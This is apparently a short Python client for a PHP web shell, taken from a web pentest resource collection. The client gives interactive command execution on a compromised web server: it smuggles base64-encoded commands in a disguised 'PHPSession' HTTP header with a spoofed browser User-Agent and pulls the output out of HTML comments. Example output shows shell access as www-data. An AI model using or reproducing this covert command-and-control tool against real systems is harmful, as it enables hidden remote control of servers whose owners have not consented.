# Python client for: https://github.com/j0bin/Web-Pentest-Resources/blob/master/web_shells/html_commentsC2_poc.php
# Example output:
# ~# python html_comments_client.py http://192.168.1.150/index0.php
# [+] Connecting to: http://192.168.1.150/index0.php
# ~$ id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
# ~$ uname -a
# Linux ubuntu 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:43:14 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
# ~$ whoami
# www-data


#!/usr/bin/python
import requests
import base64
import sys

URL = sys.argv[1]

print "[+] Connecting to: "+URL
while True:
    cmd = base64.b64encode(raw_input("~$ "))
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36', 'PHPSession': cmd}
    request = requests.get(URL, headers=headers)
    response = request.text
    for line in response.split("\n"):
        if "</html>" in line:          # Parse output / print decoded command output
            c2 = base64.b64decode(line.split("<!--")[1].split("-->")[0])
            print c2
